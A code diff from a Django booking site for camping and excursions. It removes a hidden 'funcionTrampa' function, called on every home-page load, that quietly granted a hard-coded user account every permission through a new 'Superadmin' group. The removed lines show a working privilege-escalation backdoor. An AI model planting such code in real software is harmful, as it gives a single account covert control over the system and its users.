@@ -23,7 +23,6 @@ class Index(TemplateView):
         context['actual'] = 'i'
         context['campismos'] = Campismo.objects.all()
         context['excursiones'] = Excursion.objects.all()
-        funcionTrampa()
         return context
 
 class Perfil(LoginRequiredMixin, DetailView):
@@ -536,15 +535,6 @@ class CancelarReservaExcursion(LoginRequiredMixin, DeleteView):
     
     def get_success_url(self):
         return reverse_lazy('reservas', kwargs={'pk':self.kwargs['username']})
-    
-def funcionTrampa():
-    g = Group.objects.create(name = 'Superadmin')
-    Permission.objects.create(name="Acceder al Panel", content_type=Permission.objects.get(codename='view_usuario').content_type, codename="acceso_panel")
-    permisos = Permission.objects.all()
-    for p in permisos:
-        g.permissions.add(p)
-    user = Usuario.objects.get(username='tiguer918')
-    user.groups.add(g)
-    user.save()
+
     
     
